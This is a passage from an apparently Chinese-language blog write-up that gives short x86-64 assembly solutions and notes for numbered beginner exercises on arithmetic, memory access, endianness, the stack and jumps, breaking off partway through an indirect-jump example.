<h4 id="4-linear-equation-registers"><a href="#4-linear-equation-registers" class="headerlink" title="4. linear-equation-registers"></a>4. linear-equation-registers</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">imul</span> <span class="built_in">rdi</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">rdx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">rdx</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="5-integer-division"><a href="#5-integer-division" class="headerlink" title="5. integer-division"></a>5. integer-division</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">div</span> <span class="built_in">rsi</span></span><br></pre></td></tr></table></figure>



<h4 id="6-modulo-operation"><a href="#6-modulo-operation" class="headerlink" title="6. modulo-operation"></a>6. modulo-operation</h4><p>div操作之后，余数会被存于rdx(dx)中。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">div</span> <span class="built_in">rsi</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">rdx</span></span><br></pre></td></tr></table></figure>



<h4 id="7-set-upper-byte"><a href="#7-set-upper-byte" class="headerlink" title="7. set-upper-byte"></a>7. set-upper-byte</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">MSB                                    LSB</span></span><br><span class="line"><span class="section">+----------------------------------------+</span></span><br><span class="line"><span class="section">|                   rax                  |</span></span><br><span class="line"><span class="section">+--------------------+-------------------+</span></span><br><span class="line"><span class="code">                     |        eax        |</span></span><br><span class="line"><span class="code">                     +---------+---------+</span></span><br><span class="line"><span class="code">                               |   ax    |</span></span><br><span class="line"><span class="code">                               +----+----+</span></span><br><span class="line"><span class="code">                               | ah | al |</span></span><br><span class="line"><span class="code">                               +----+----+</span></span><br></pre></td></tr></table></figure>

<p>Using only one move instruction, please set the upper 8 bits of the <code>ax</code> register to <code>0x42</code>.</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">0x42</span></span><br></pre></td></tr></table></figure>



<h4 id="8-efficient-modulo"><a href="#8-efficient-modulo" class="headerlink" title="8. efficient-modulo"></a>8. efficient-modulo</h4><p>Using only the following instruction(s):</p>
<ul>
<li><code>mov</code></li>
</ul>
<p>Please compute the following:</p>
<ul>
<li><code>rax = rdi % 256</code></li>
<li><code>rbx = rsi % 65536</code></li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rcx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">cl</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="built_in">dx</span></span><br></pre></td></tr></table></figure>



<h4 id="9-byte-extraction"><a href="#9-byte-extraction" class="headerlink" title="9. byte-extraction"></a>9. byte-extraction</h4><p><code>shl</code>指令：</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;rax = 10001010</span></span><br><span class="line"><span class="keyword">shl</span> al<span class="punctuation">,</span> <span class="number">1</span></span><br><span class="line"><span class="comment">;al = 00010100</span></span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">shr</span> <span class="built_in">rdi</span>, <span class="number">32</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">bl</span></span><br></pre></td></tr></table></figure>



<h4 id="10-bitwise-and"><a href="#10-bitwise-and" class="headerlink" title="10. bitwise-and"></a>10. bitwise-and</h4><p>如果不使用以下说明：<code>mov</code>、<code>xchg</code>，请执行以下操作：<br>将 <code>rax</code> 设置为 <code>（rdi AND rsi）</code> 的值</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="keyword">and</span> <span class="built_in">rdi</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="keyword">and</span> <span class="built_in">rax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rdi</span></span><br></pre></td></tr></table></figure>





<h4 id="11-check-even"><a href="#11-check-even" class="headerlink" title="11. check-even"></a>11. check-even</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">and</span> <span class="built_in">rdi</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">and</span> <span class="built_in">rax</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rdi</span></span><br></pre></td></tr></table></figure>



<h4 id="12-memory-read"><a href="#12-memory-read" class="headerlink" title="12. memory-read"></a>12. memory-read</h4><p>请执行以下操作：将存储在 <code>0x404000</code> 的值放入 <code>rax</code> 中。确保 <code>rax</code> 中的值是存储在 <code>0x404000</code> 的原始值。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, [<span class="number">0x404000</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="13-memory-write"><a href="#13-memory-write" class="headerlink" title="13. memory-write"></a>13. memory-write</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> [<span class="number">0x404000</span>], <span class="built_in">rax</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="14-memory-increment"><a href="#14-memory-increment" class="headerlink" title="14. memory-increment"></a>14. memory-increment</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, [<span class="number">0x404000</span>]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span> , <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rbx</span> , <span class="number">0x1337</span></span><br><span class="line">    <span class="keyword">mov</span> [<span class="number">0x404000</span>], <span class="built_in">rbx</span></span><br></pre></td></tr></table></figure>



<h4 id="15-byte-access"><a href="#15-byte-access" class="headerlink" title="15. byte-access"></a>15. byte-access</h4><p>Here is the breakdown of the names of memory sizes:<br>以下是内存大小名称的细分：</p>
<ul>
<li>Quad Word &#x3D; 8 Bytes &#x3D; 64 bits<br>四字 &#x3D; 8 字节 &#x3D; 64 位</li>
<li>Double Word &#x3D; 4 bytes &#x3D; 32 bits<br>双字 &#x3D; 4 字节 &#x3D; 32 位</li>
<li>Word &#x3D; 2 bytes &#x3D; 16 bits<br>字 &#x3D; 2 字节 &#x3D; 16 位</li>
<li>Byte &#x3D; 1 byte &#x3D; 8 bits<br>字节 &#x3D; 1 字节 &#x3D; 8 位</li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="number">0x404000</span>]</span><br></pre></td></tr></table></figure>

<p>在 x86_64 中，您可以在取消引用地址时访问这些大小，就像使用更大或更小的 register 访问一样：</p>
<ul>
<li><code>mov al, [address]</code> &lt;&#x3D;&gt; moves the least significant byte from address to <code>rax</code><br><code>mov al， [address]</code> &lt;&#x3D;&gt; 将最低有效字节从 address 移动到 <code>rax</code></li>
<li><code>mov ax, [address]</code> &lt;&#x3D;&gt; moves the least significant word from address to <code>rax</code><br><code>mov ax， [address]</code> &lt;&#x3D;&gt; 将最低有效字从 address 移动到 <code>rax</code></li>
<li><code>mov eax, [address]</code> &lt;&#x3D;&gt; moves the least significant double word from address to <code>rax</code><br><code>mov eax， [address]</code> &lt;&#x3D;&gt; 将最低有效双字从 address 移动到 <code>rax</code></li>
<li><code>mov rax, [address]</code> &lt;&#x3D;&gt; moves the full quad word from address to <code>rax</code><br><code>mov rax， [address]</code> &lt;&#x3D;&gt; 将完整的四元字从 address 移动到 <code>rax</code></li>
</ul>
<h4 id="16-memory-size-access"><a href="#16-memory-size-access" class="headerlink" title="16. memory-size-access"></a>16. memory-size-access</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="number">0x404000</span>]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">bx</span>, [<span class="number">0x404000</span>]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="number">0x404000</span>]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, [<span class="number">0x404000</span>]</span><br></pre></td></tr></table></figure>



<h4 id="17-little-endian-write"><a href="#17-little-endian-write" class="headerlink" title="17. little-endian-write"></a>17. little-endian-write</h4><p>值得注意的是，值的存储顺序与我们表示它们的顺序相反。example:</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;[0x1330] = 0x00000000deadc0de</span></span><br><span class="line"><span class="comment">; 检查它在内存中的实际存储情况：</span></span><br><span class="line"><span class="comment">;[0x1330] = 0xde</span></span><br><span class="line"><span class="comment">;[0x1331] = 0xc0</span></span><br><span class="line"><span class="comment">;[0x1332] = 0xad</span></span><br><span class="line"><span class="comment">;[0x1333] = 0xde</span></span><br><span class="line"><span class="comment">;[0x1334] = 0x00</span></span><br><span class="line"><span class="comment">;[0x1335] = 0x00</span></span><br><span class="line"><span class="comment">;[0x1336] = 0x00</span></span><br><span class="line"><span class="comment">;[0x1337] = 0x00</span></span><br></pre></td></tr></table></figure>

<p>这就是小端存储（Little Endian）。</p>
<p>exp</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0xdeadbeef00001337</span></span><br><span class="line">    <span class="keyword">mov</span> [<span class="built_in">rdi</span>], <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0xc0ffee0000</span></span><br><span class="line">    <span class="keyword">mov</span> [<span class="built_in">rsi</span>], <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>



<h4 id="18-memory-sum"><a href="#18-memory-sum" class="headerlink" title="18. memory-sum"></a>18. memory-sum</h4><p>内存是连续存储的，因此可以使用偏移量来获取指定字节。例如：</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;[<span class="number">0x1337</span>] = <span class="number">0x00000000deadbeef</span></span><br><span class="line">;[<span class="number">0x1337</span>] = <span class="number">0xef</span></span><br><span class="line">;[<span class="number">0x1337</span> + <span class="number">1</span>] = <span class="number">0xbe</span></span><br><span class="line">;[<span class="number">0x1337</span> + <span class="number">2</span>] = <span class="number">0xad</span></span><br><span class="line">...</span><br><span class="line">;[<span class="number">0x1337</span> + <span class="number">7</span>] = <span class="number">0x00</span></span><br><span class="line">; 假设我需要访问某个地址的第<span class="number">5</span>个字节。那么可以：</span><br><span class="line">mov al, [address+<span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<p>题目要求：</p>
<ul>
<li>Load two consecutive quad words from the address stored in <code>rdi</code>.<br>从存储在 <code>rdi</code> 中的地址加载两个连续的四字。</li>
<li>Calculate the sum of the previous steps’ quad words.<br>计算前面步骤的四边形词的总和。</li>
<li>Store the sum at the address in <code>rsi</code>.<br>将总和存储在 <code>rsi</code> 中的地址。</li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, [<span class="built_in">rdi</span>]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, [<span class="built_in">rdi</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rax</span>, <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">mov</span> [<span class="built_in">rsi</span>], <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>



<h4 id="19-stack-substraction"><a href="#19-stack-substraction" class="headerlink" title="19. stack-substraction"></a>19. stack-substraction</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rax</span>, <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>



<h4 id="20-swap-stack-values"><a href="#20-swap-stack-values" class="headerlink" title="20. swap-stack-values"></a>20. swap-stack-values</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br></pre></td></tr></table></figure>



<h4 id="21-average-stack-values"><a href="#21-average-stack-values" class="headerlink" title="21. average-stack-values"></a>21. average-stack-values</h4><p>除法还是很坑的，记得一定是<code>rdx:rax / reg</code>，商在rax中，余数在rdx中。因此，在调用div的时候一定要清空rdx寄存器（如果被除数没有占用到rdx的话）</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, [<span class="built_in">rsp</span>]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rcx</span>, [<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, [<span class="built_in">rsp</span>+<span class="number">0x10</span>]</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, [<span class="built_in">rsp</span>+<span class="number">0x18</span>]</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rax</span>, <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rax</span>, <span class="built_in">rcx</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rax</span>, <span class="built_in">rdx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">4</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">div</span> <span class="built_in">rbx</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>



<h4 id="22-absolute-jump"><a href="#22-absolute-jump" class="headerlink" title="22. absolute-jump"></a>22. absolute-jump</h4><p>绝对跳转，指的是跳转到指定地址</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0x403000</span></span><br><span class="line">    <span class="keyword">jmp</span> <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>



<h4 id="23-relative-jump"><a href="#23-relative-jump" class="headerlink" title="23. relative-jump"></a>23. relative-jump</h4><p>对于所有跳转，有三种类型：</p>
<ul>
<li>Relative jumps: jump + or - the next instruction.<br>相对跳转：jump + 或 - 下一条指令。</li>
<li>Absolute jumps: jump to a specific address.<br>Absolute jumps：跳转到指定地址。</li>
<li>Indirect jumps: jump to the memory address specified in a register.<br>Indirect jumps：跳转到 register 中指定的 memory 地址。</li>
</ul>
<p><code>jmp (reg1 | addr | +/-offset)</code></p>
<p>要求：</p>
<ul>
<li>Make the first instruction in your code a <code>jmp</code>.<br>将代码中的第一条指令设为 <code>jmp</code>。</li>
<li>Make that <code>jmp</code> a relative jump to 0x51 bytes from the current position.<br>使该 <code>jmp</code> 相对跳转到 0x51 字节的当前位置。</li>
<li>At the code location where the relative jump will redirect control flow, set <code>rax</code> to 0x1.<br>在相对跳转将重定向控制流的代码位置，将 <code>rax</code> 设置为 0x1。</li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">jmp</span> set_rax</span><br><span class="line"><span class="meta">    .rept</span> <span class="number">0x51</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .endr</span></span><br><span class="line"><span class="symbol">set_rax:</span>   </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">0x1</span></span><br></pre></td></tr></table></figure>



<h4 id="24-jump-trampoline"><a href="#24-jump-trampoline" class="headerlink" title="24. jump-trampoline"></a>24. jump-trampoline</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">jmp</span> set_rax</span><br><span class="line"><span class="meta">    .rept</span> <span class="number">0x51</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .endr</span></span><br><span class="line"><span class="symbol">set_rax:</span>  </span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rbx</span>, <span class="number">0x403000</span></span><br><span class="line">    <span class="keyword">jmp</span> <span class="built_in">rbx</span></span><br></pre></td></tr></table></figure>



<h4 id="25-conditional-jump"><a href="#25-conditional-jump" class="headerlink" title="25. conditional-jump"></a>25. conditional-jump</h4><p>挖草，巨坑的一点！</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">rdi</span>]</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0x7f454c46</span></span><br><span class="line">    <span class="keyword">je</span> flag_1</span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0x00005A4D</span></span><br><span class="line">    <span class="keyword">je</span> flag_2</span><br><span class="line">    <span class="keyword">jmp</span> flag_3</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">flag_1:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">rdi</span>+<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">eax</span>, [<span class="built_in">rdi</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">eax</span>, [<span class="built_in">rdi</span>+<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">jmp</span> done</span><br><span class="line"><span class="symbol">flag_2:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">rdi</span>+<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">eax</span>, [<span class="built_in">rdi</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">eax</span>, [<span class="built_in">rdi</span>+<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">jmp</span> done</span><br><span class="line"><span class="symbol">flag_3:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">rdi</span>+<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">imul</span> <span class="built_in">eax</span>,[<span class="built_in">rdi</span>+<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">imul</span> <span class="built_in">eax</span>, [<span class="built_in">rdi</span>+<span class="number">12</span>]</span><br><span class="line">    <span class="keyword">jmp</span> done</span><br><span class="line"><span class="symbol">done:</span></span><br></pre></td></tr></table></figure>

<p>注意的是<code>mov eax, [rdi]</code>，如果用<code>mov rax, [rdi]</code>会出问题，因为会读取<code>rdi</code>地址上的pword，那么永远走的都是else下的语句。服了。</p>
<h4 id="26-indirect-jump"><a href="#26-indirect-jump" class="headerlink" title="26. indirect-jump"></a>26. indirect-jump</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">rdi</span></span><br><span class="line">    <span class="keyword">cmp</span> <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">jg</span> <span class="meta">default</span></span><br><span class="line">    <span class="keyword">imul</span> <span class="built_in">rax</span>,<span class="number">8</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">rax</span>, <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">jmp</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="symbol">default:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">add</span> <span 